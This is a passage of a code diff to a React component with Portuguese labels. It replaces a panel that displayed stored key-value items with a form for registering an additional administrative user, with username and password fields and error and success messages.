+                    <div className="bg-[#25201c] border border-[#3e352e] p-4 rounded-none animate-fade-in h-[320px]">
+                      <p className="text-[9px] text-[#cfab7c] font-bold uppercase tracking-widest font-mono mb-3">
+                        CADASTRAR OUTRO USUÁRIO ADMINISTRATIVO
                       </p>
-                      <button
-                        type="button"
-                        onClick={refreshStorageData}
-                        className="text-[8px] text-[#cfab7c] hover:text-[#ebdcc6] font-mono font-bold uppercase tracking-widest cursor-pointer bg-transparent border-none"
-                      >
-                        Atualizar
-                      </button>
-                    </div>
-                    <div className="space-y-2 max-h-[160px] overflow-y-auto">
-                      {storageItems.length === 0 ? (
-                        <p className="text-[10px] text-stone-500 font-mono text-center py-2">
-                          Nenhum item.
+
+                      {adminError && (
+                        <p className="text-[10px] text-red-400 font-mono bg-red-950/40 p-2 border border-red-900/30 mb-3">
+                          {adminError}
                         </p>
-                      ) : (
-                        storageItems.map((item) => (
-                          <div key={item.key} className="bg-[#1c1815] border border-[#3e352e] p-2 rounded-none">
-                            <p className="text-[8px] text-[#b39063] font-bold uppercase tracking-widest font-mono mb-0.5 truncate">
-                              {item.key}
-                            </p>
-                            <pre className="text-[10px] text-[#ebdcc6] font-mono whitespace-pre-wrap break-all leading-relaxed">
-                              {(() => {
-                                try {
-                                  const parsed = JSON.parse(item.value);
-                                  if (typeof parsed === "object" && parsed !== null) {
-                                    return Object.entries(parsed)
-                                      .map(([k, v]) => `${k}: ${v}`)
-                                      .join("\n");
-                                  }
-                                  return item.value;
-                                } catch {
-                                  return item.value;
-                                }
-                              })()}
-                            </pre>
-                          </div>
-                        ))
                       )}
+
+                      {adminSuccess && (
+                        <p className="text-[10px] text-emerald-400 font-mono bg-emerald-950/40 p-2 border border-emerald-900/30 mb-3">
+                          {adminSuccess}
+                        </p>
+                      )}
+
+                      <form onSubmit={handleRegisterAdditionalAdmin} className="space-y-4">
+                        <div>
+                          <label className="block text-[8px] text-stone-400 mb-1 font-bold uppercase tracking-widest font-mono">
+                            Novo Usuário Admin
+                          </label>
+                          <input
+                            type="text"
+                            value={adminUser}
+                            onChange={(e) => setAdminUser(e.target.value)}
+                            placeholder="Ex: admin_secundario"
+                            required
+                            className="w-full bg-[#1c1815] border border-[#3e352e] text-xs text-[#ebdcc6] px-3 py-2 rounded-none focus:outline-none focus:border-[#cfab7c] font-mono"
+                          />
+                        </div>
+                        <div>
+                          <label className="block text-[8px] text-stone-400 mb-1 font-bold uppercase tracking-widest font-mono">
+                            Senha de Acesso
+                          </label>
+                          <input
+                            type="password"
+                            value={adminPass}
+                            onChange={(e) => setAdminPass(e.target.value)}
+                            placeholder="••••••••"
+                            required
+                            className="w-full bg-[#1c1815] border border-[#3e352e] text-xs text-[#ebdcc6] px-3 py-2 rounded-none focus:outline-none focus:border-[#cfab7c] font-mono"
+                          />
+                        </div>
+
+                        <button
+                          type="submit"
+                          className="w-full py-2 bg-[#cfab7c] hover:bg-[#b39063] text-[#1c1815] font-bold text-[10px] uppercase tracking-widest rounded-none font-mono cursor-pointer border-none"
+                        >
+                          Registrar Novo Admin
+                        </button>
+                      </form>
                     </div>
-                  </div>
+                  )}
 
                 </div>
               )}
